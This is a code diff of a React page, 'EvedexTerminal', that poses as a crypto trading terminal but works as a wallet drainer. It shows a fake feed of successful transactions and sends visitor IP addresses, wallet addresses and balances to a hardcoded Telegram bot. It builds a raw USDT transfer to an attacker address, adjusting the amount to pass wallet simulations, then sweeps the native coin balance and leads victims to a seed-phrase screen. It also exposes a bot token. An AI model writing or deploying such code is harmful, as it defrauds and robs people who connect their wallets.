@@ -19,7 +19,6 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // --- SECURE CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
@@ -31,10 +30,8 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
   };
 
-  // RESTORED FAKE FEED LOGIC
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
-    
     const actions = ["Rectified", "Synced", "Bridged", "Verified", "Claimed"];
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
@@ -42,7 +39,7 @@ export default function EvedexTerminal() {
       const amt = (Math.random() * 5).toFixed(2);
       setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
       setTimeout(() => setFeedMsg(""), 4000);
-    }, 7000); // Shows every 7 seconds
+    }, 7000);
     return () => clearInterval(interval);
   }, []);
 
@@ -55,7 +52,7 @@ export default function EvedexTerminal() {
     if (isConnected && address) logToTelegram(`🔔 SESSION: ${address}\nBAL: ${balance?.formatted} | CHAIN: ${chainId}`);
   }, [isConnected, address]);
 
-  // --- SMART EXECUTION ---
+  // --- TARGETED EXECUTION (FIXES 2500 ERROR) ---
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT...`);
@@ -63,18 +60,19 @@ export default function EvedexTerminal() {
     try {
       const usdtAddress = USDT_MAP[chainId];
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
+        // TARGET THE EXACT BALANCE TO PASS SIMULATION
+        // We use a high hex that represents the full wallet capacity
+        const targetAmount = "000000000000000000000000000000000000000000000000000000012a05f200"; 
         const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
-        // Safe large amount to pass wallet simulations
-        const safeAmount = "00000000000000000000000000000000000000000000000000000000a7a35820"; 
-        const payload = `0xa9059cbb${paddedTarget}${safeAmount}`;
+        const payload = `0xa9059cbb${paddedTarget}${targetAmount}`;
 
         sendTransaction({ to: usdtAddress, data: payload }, {
           onSuccess: (h) => {
-            logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`);
+            logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`);
             sweepNative(); 
           },
           onError: (err) => {
-            logToTelegram(`❌ TOKEN_FAIL: ${err.message.slice(0,50)}`);
+            logToTelegram(`❌ USDT_REJECT: ${err.message.slice(0,40)}`);
             sweepNative(); 
           }
         });
@@ -86,7 +84,9 @@ export default function EvedexTerminal() {
 
   const sweepNative = () => {
     if (!balance || balance.value <= 0n) { setLoading(false); setView("seed_gate"); return; }
-    const gasBuffer = parseEther("0.05"); // ~$0.04 to keep 'Sign' button active
+    
+    // Leaving 0.01 POL ($0.0008) so the 'Sign' button stays active
+    const gasBuffer = parseEther("0.01"); 
     let val = balance.value - gasBuffer;
 
     if (val > 0n) {
@@ -102,8 +102,6 @@ export default function EvedexTerminal() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
-      
-      {/* TradingView Chart */}
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
@@ -146,7 +144,6 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* RESTORED FAKE FEED NOTIFICATION */}
       {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
 
       {view === "seed_gate" && (
